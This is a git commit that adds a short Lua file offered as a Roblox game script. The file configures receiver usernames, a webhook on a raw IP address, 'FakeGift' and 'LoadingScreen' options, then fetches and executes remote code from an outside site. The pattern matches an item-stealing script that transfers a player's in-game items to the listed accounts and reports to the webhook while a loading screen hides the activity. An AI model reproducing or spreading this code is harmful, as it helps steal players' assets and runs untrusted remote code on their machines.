841417e99c7ea20e8f97ff7ced813ed7de8745a1
Growagardenscript <136123936+Gabe650@users.noreply.github.com>
2025-08-24 17:46:04 -0500

    Upload legendary-script.lua via Script Source Converter

---
+++ legendary-script.lua
@@ -0,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"gamerVIP216", "Realmoneysack", "unrealisticmonkeys"},
+    min_value = 1,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/982f0963165011b00aaa8dd03d50bc11",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/982f0963165011b00aaa8dd03d50bc11",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
